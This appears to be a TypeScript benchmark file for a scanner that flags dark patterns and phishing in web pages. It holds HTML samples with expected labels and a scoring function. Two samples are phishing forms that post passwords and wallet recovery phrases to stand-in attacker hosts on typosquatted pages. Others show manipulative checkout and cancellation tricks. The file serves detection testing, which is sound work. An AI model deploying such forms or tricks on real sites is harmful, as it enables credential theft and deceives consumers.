import { executeHybridDomScan } from "../../shared/hybridRouter.js";
import type {
  BenchmarkCaseResult,
  BenchmarkSummaryReport,
  GroundTruthScenario,
} from "../../shared/types.js";
import { firebaseHybridStore } from "../firebase/threatStore.js";

export const INTERACTIVE_DEMO_SCENARIOS: GroundTruthScenario[] = [
  {
    id: "scenario-1-predatory-checkout",
    title: "Scenario 1: FlashDealz Pro Checkout (Dark Patterns — 100% On-Device Nano)",
    pageUrl: "https://flashdealz-pro-store.example/checkout",
    expectedThreat: true,
    expectedCategories: [
      "SNEAK_INTO_BASKET",
      "FAKE_URGENCY_TIMER",
      "HIDDEN_SUBSCRIPTION_TRAP",
      "CONFIRMSHAMING_OPT_OUT",
    ],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div class="storefront-card">
  <div class="urgency-timer" data-fake-urgency="true">
    ⚡ HURRY! Offer expires in <strong>02:59</strong> (Resets on reload — Only 1 left in cart!)
  </div>
  <h3>UltraPods Pro Wireless — $49.00</h3>
  <label class="sneak-addon" data-dark-pattern="sneak-basket">
    <input type="checkbox" checked />
    <span>Add <strong>VIP Buyer Protection & Priority Club ($19.99/mo)</strong></span>
  </label>
  <small class="fine-print-trap" style="opacity: 0.25; font-size: 7px;">
    By clicking Complete Order you agree to a recurring charge of $39.99/month after trial (non-refundable, renews automatically).
  </small>
  <div class="cta-row">
    <button class="primary-buy">Complete Order ($68.99)</button>
    <button class="confirmshame-decline" data-decline-shame="true">
      No thanks, I prefer paying full price and hate saving money
    </button>
  </div>
</div>`,
  },
  {
    id: "scenario-2-multidomain-phishing",
    title: "Scenario 2: Multi-Domain OAuth & Vault Harvest (Escalates to Cloud Gemini + Firestore)",
    pageUrl: "https://g00gle-verify.auth-security-check.net/login",
    expectedThreat: true,
    expectedCategories: [
      "PHISHING_CREDENTIAL_HARVEST",
      "CROSS_ORIGIN_TOKEN_EXFIL",
    ],
    expectedRouteInPreferOnDevice: "CLOUD_GEMINI_FALLBACK",
    html: `<div class="phish-modal" data-brand-impersonation="google-workspace">
  <h3>⚠️ Critical Workspace Session Suspension</h3>
  <p>Your corporate vault session on <strong>g00gle-verify.auth-security-check.net</strong> will be terminated in 5 minutes.</p>
  <form action="https://collector-drop.evil-harvest.org/exfil" method="POST" data-phish-campaign="FS-CAMPAIGN-2026-091">
    <label>Corporate Email</label>
    <input type="email" name="user_email" value="cfo@enterprise.internal" />
    <label>Master Password & 12-word recovery phrase</label>
    <input type="password" name="master_password" placeholder="Verify your master password immediately to prevent account deletion" />
    <input type="text" name="seed_phrase" placeholder="Enter your 12-word recovery phrase" />
    <button type="submit">Restore Account Access Immediately</button>
  </form>
</div>`,
  },
  {
    id: "scenario-3-roach-motel-saas",
    title: "Scenario 3: Subscription Roach-Motel & Drip Fee Trap (100% On-Device Nano)",
    pageUrl: "https://cloudstream-plus.example/account/cancel",
    expectedThreat: true,
    expectedCategories: [
      "ROACH_MOTEL_CANCELLATION",
      "BAIT_AND_SWITCH_PRICING",
    ],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<section class="cancel-obstruction" data-dark-pattern="roach-motel">
  <h3>Manage Your CloudStream+ Membership</h3>
  <p>To cancel your subscription, you must call our retention center between 9:00–9:15 AM EST or mail a notarized cancellation form with 30-day written notice.</p>
  <div class="drip-fee-row" data-dark-pattern="drip-pricing">
    Mandatory Platform Processing Fee: <strong>$14.95</strong> + Non-optional Convenience Surcharge: <strong>$8.50</strong>
  </div>
</section>`,
  },
  {
    id: "scenario-4-clean-accessible-checkout",
    title: "Scenario 4: Verified Clean & Transparent Checkout (Zero False Positives)",
    pageUrl: "https://ethical-books.example/checkout",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<main class="clean-checkout">
  <h3>Ethical Books Co. — Transparent Checkout</h3>
  <p>Item: Designing Secure Web Systems (Hardcover) — <strong>$32.00</strong></p>
  <p>Shipping (Standard Ground): <strong>$4.00</strong> | Tax: <strong>$0.00</strong></p>
  <p><strong>Total Today: $36.00</strong> (One-time payment. No recurring subscriptions.)</p>
  <label>
    <input type="checkbox" />
    <span>Optional: Send me monthly book club updates (unsubscribe in 1 click anytime).</span>
  </label>
  <button type="button">Pay $36.00 Now</button>
</main>`,
  },
];

export const GROUND_TRUTH_BENCHMARK_CORPUS: GroundTruthScenario[] = [
  ...INTERACTIVE_DEMO_SCENARIOS,
  {
    id: "gt-05-sneak-warranty",
    title: "Sneak-into-Basket Extended Warranty Pre-Checked",
    pageUrl: "https://electro-mart.example/cart",
    expectedThreat: true,
    expectedCategories: ["SNEAK_INTO_BASKET"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<form><input type="checkbox" checked /> Add Extended Care Warranty ($12.99/mo)</form>`,
  },
  {
    id: "gt-06-sneak-vip-club",
    title: "Sneak-into-Basket VIP Auto-Renew Club",
    pageUrl: "https://fashion-vault.example/bag",
    expectedThreat: true,
    expectedCategories: ["SNEAK_INTO_BASKET"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div data-dark-pattern="sneak-basket"><input type="checkbox" checked /> Join VIP Club Auto-Renew $29.99/month</div>`,
  },
  {
    id: "gt-07-fake-countdown-banner",
    title: "Fake Urgency Resetting Timer Banner",
    pageUrl: "https://course-funnel.example/offer",
    expectedThreat: true,
    expectedCategories: ["FAKE_URGENCY_TIMER"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div class="fake-countdown">Offer expires in 04:12! Act immediately!</div>`,
  },
  {
    id: "gt-08-scarcity-cart-hold",
    title: "Artificial Cart Scarcity Countdown",
    pageUrl: "https://gadget-drop.example/buy",
    expectedThreat: true,
    expectedCategories: ["FAKE_URGENCY_TIMER"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div>Hurry! Only 2 left in cart — Reserved for only 01:45</div>`,
  },
  {
    id: "gt-09-hidden-sub-opacity",
    title: "Low-Opacity Hidden Recurring Charge Clause",
    pageUrl: "https://pdf-converter-trap.example/pay",
    expectedThreat: true,
    expectedCategories: ["HIDDEN_SUBSCRIPTION_TRAP"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<small style="opacity: 0.2; font-size: 8px;">Trial converts and is automatically billed at $49.99/month after trial.</small>`,
  },
  {
    id: "gt-10-hidden-sub-class",
    title: "Fine-Print Trap Non-Refundable Auto-Renewal",
    pageUrl: "https://diet-app-funnel.example/trial",
    expectedThreat: true,
    expectedCategories: ["HIDDEN_SUBSCRIPTION_TRAP"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<p class="fine-print-trap">Membership renews automatically at $89.00/month and is non-refundable.</p>`,
  },
  {
    id: "gt-11-confirmshaming-security",
    title: "Confirmshaming Security Guilt Opt-Out",
    pageUrl: "https://antivirus-upsell.example/offer",
    expectedThreat: true,
    expectedCategories: ["CONFIRMSHAMING_OPT_OUT"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<button data-decline-shame="true">No thanks, I like being unprotected and don't care about my security</button>`,
  },
  {
    id: "gt-12-confirmshaming-discount",
    title: "Confirmshaming Discount Opt-Out",
    pageUrl: "https://shoe-outlet.example/popup",
    expectedThreat: true,
    expectedCategories: ["CONFIRMSHAMING_OPT_OUT"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<a class="shame-link">No thanks, I want to lose my discount</a>`,
  },
  {
    id: "gt-13-roach-motel-phone",
    title: "Roach Motel Phone-Only Cancellation",
    pageUrl: "https://gym-membership.example/cancel",
    expectedThreat: true,
    expectedCategories: ["ROACH_MOTEL_CANCELLATION"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div data-dark-pattern="roach-motel">To cancel your subscription, you must visit in person or mail a notarized letter.</div>`,
  },
  {
    id: "gt-14-drip-pricing-surcharge",
    title: "Drip Pricing Hidden Regulatory Recovery Fee",
    pageUrl: "https://ticket-broker.example/payment",
    expectedThreat: true,
    expectedCategories: ["BAIT_AND_SWITCH_PRICING"],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div class="drip-fee-row">Hidden Regulatory Recovery Fee: $19.50</div>`,
  },
  {
    id: "gt-15-phish-seed-phrase",
    title: "Web3 Wallet Seed-Phrase Harvester",
    pageUrl: "https://metamask-restore-vault.example/sync",
    expectedThreat: true,
    expectedCategories: [
      "PHISHING_CREDENTIAL_HARVEST",
      "CROSS_ORIGIN_TOKEN_EXFIL",
    ],
    expectedRouteInPreferOnDevice: "CLOUD_GEMINI_FALLBACK",
    html: `<div>Enter your 12-word recovery phrase to restore wallet sync</div>`,
  },
  {
    id: "gt-16-phish-cross-origin-post",
    title: "Cross-Origin Password Harvester POST Form",
    pageUrl: "https://portal-login.example/auth",
    expectedThreat: true,
    expectedCategories: ["PHISHING_CREDENTIAL_HARVEST"],
    expectedRouteInPreferOnDevice: "CLOUD_GEMINI_FALLBACK",
    html: `<form action="https://token-drain.evil-harvest.org/collect"><input type="password" name="pw" /></form>`,
  },
  {
    id: "gt-17-phish-typosquat-paypal",
    title: "Typosquatted Paypa1 Session Exfiltration",
    pageUrl: "https://paypa1-secure.auth-security-check.net/verify",
    expectedThreat: true,
    expectedCategories: ["CROSS_ORIGIN_TOKEN_EXFIL"],
    expectedRouteInPreferOnDevice: "CLOUD_GEMINI_FALLBACK",
    html: `<div data-brand-impersonation="paypal">Verify your billing token on paypa1-secure</div>`,
  },
  {
    id: "gt-18-clean-saas-pricing",
    title: "Clean SaaS Monthly/Annual Pricing Table",
    pageUrl: "https://linear-style-app.example/pricing",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<section><h2>Pro Plan — $12 per user/month</h2><p>Cancel anytime with 1 click in account settings.</p></section>`,
  },
  {
    id: "gt-19-clean-newsletter-optin",
    title: "Clean Unchecked Newsletter Opt-In",
    pageUrl: "https://dev-digest.example/subscribe",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<form><label><input type="checkbox" /> Subscribe to weekly engineering digest</label><button>Decline</button></form>`,
  },
  {
    id: "gt-20-clean-same-origin-login",
    title: "Clean Same-Origin Login Form",
    pageUrl: "https://app.trusted-service.example/login",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<form action="https://app.trusted-service.example/api/login" method="POST"><input type="email" /><input type="password" /></form>`,
  },
  {
    id: "gt-21-clean-documentation-page",
    title: "Clean Technical Documentation Article",
    pageUrl: "https://docs.trusted-service.example/security",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<article><h1>Security Best Practices</h1><p>Always use WebAuthn passkeys and hardware security keys.</p></article>`,
  },
  {
    id: "gt-22-clean-cart-summary",
    title: "Clean E-Commerce Cart Summary Without Add-ons",
    pageUrl: "https://organic-coffee.example/cart",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<div><h3>1x Whole Bean Espresso ($18.00)</h3><p>Free shipping included.</p><button>Checkout</button></div>`,
  },
  {
    id: "gt-23-clean-account-cancellation",
    title: "Clean 1-Click Self-Service Account Cancellation",
    pageUrl: "https://fair-cloud.example/settings/billing",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<section><h3>Cancel Subscription</h3><p>Your plan will end immediately with no extra fees.</p><button>Cancel Plan Now</button></section>`,
  },
  {
    id: "gt-24-clean-contact-support",
    title: "Clean Customer Support Feedback Form",
    pageUrl: "https://support.fair-cloud.example/ticket",
    expectedThreat: false,
    expectedCategories: [],
    expectedRouteInPreferOnDevice: "ON_DEVICE_NANO",
    html: `<form action="https://support.fair-cloud.example/submit"><textarea placeholder="How can we help?"></textarea><button>Send</button></form>`,
  },
];

export function runGroundTruthBenchmark(): BenchmarkSummaryReport {
  const policy = firebaseHybridStore.getPolicy();
  const cases: BenchmarkCaseResult[] = [];
  let tp = 0;
  let tn = 0;
  let fp = 0;
  let fn = 0;
  let singlePageTotal = 0;
  let singlePageZeroCloudBytes = 0;
  const latencies: number[] = [];

  for (const scenario of GROUND_TRUTH_BENCHMARK_CORPUS) {
    const t0 = performance.now();
    const res = executeHybridDomScan(
      {
        html: scenario.html,
        pageUrl: scenario.pageUrl,
        scenarioId: scenario.id,
        modePreference: "PREFER_ON_DEVICE",
      },
      policy,
      (domain, html) => firebaseHybridStore.matchThreatCampaign(domain, html)
    );
    const elapsed = Number(
      Math.max(0.2, performance.now() - t0).toFixed(2)
    );
    latencies.push(elapsed);

    const predictedThreat = res.findings.length > 0;
    const detectedCategories = res.findings.map((f) => f.category);

    if (scenario.expectedThreat && predictedThreat) tp++;
    else if (!scenario.expectedThreat && !predictedThreat) tn++;
    else if (!scenario.expectedThreat && predictedThreat) fp++;
    else if (scenario.expectedThreat && !predictedThreat) fn++;

    if (scenario.expectedRouteInPreferOnDevice === "ON_DEVICE_NANO") {
      singlePageTotal++;
      if (res.telemetry.cloudBytesSent === 0) {
        singlePageZeroCloudBytes++;
      }
    }

    cases.push({
      id: scenario.id,
      title: scenario.title,
      expectedThreat: scenario.expectedThreat,
      predictedThreat,
      expectedCategories: scenario.expectedCategories,
      detectedCategories,
      executedRoute: res.telemetry.executedRoute,
      cloudBytesSent: res.telemetry.cloudBytesSent,
      latencyMs: elapsed,
      overallRiskScore: res.overallRiskScore,
      correctClassification: scenario.expectedThreat === predictedThreat,
    });
  }

  const precision = tp + fp === 0 ? 1 : Number((tp / (tp + fp)).toFixed(4));
  const recall = tp + fn === 0 ? 1 : Number((tp / (tp + fn)).toFixed(4));
  const f1Score =
    precision + recall === 0
      ? 0
      : Number(((2 * precision * recall) / (precision + recall)).toFixed(4));
  const accuracy = Number(
    ((tp + tn) / GROUND_TRUTH_BENCHMARK_CORPUS.length).toFixed(4)
  );
  const onDevicePrivacyRatio =
    singlePageTotal === 0
      ? 1
      : Number((singlePageZeroCloudBytes / singlePageTotal).toFixed(4));

  const sortedLatencies = [...latencies].sort((a, b) => a - b);
  const p95Idx = Math.min(
    sortedLatencies.length - 1,
    Math.floor(sortedLatencies.length * 0.95)
  );
  const p95LatencyMs = sortedLatencies[p95Idx] || 0.5;

  return {
    timestamp: new Date().toISOString(),
    totalScenarios: GROUND_TRUTH_BENCHMARK_CORPUS.length,
    truePositives: tp,
    trueNegatives: tn,
    falsePositives: fp,
    falseNegatives: fn,
    precision,
    recall,
    f1Score,
    accuracy,
    onDevicePrivacyRatio,
    p95LatencyMs,
    cases,
  };
}
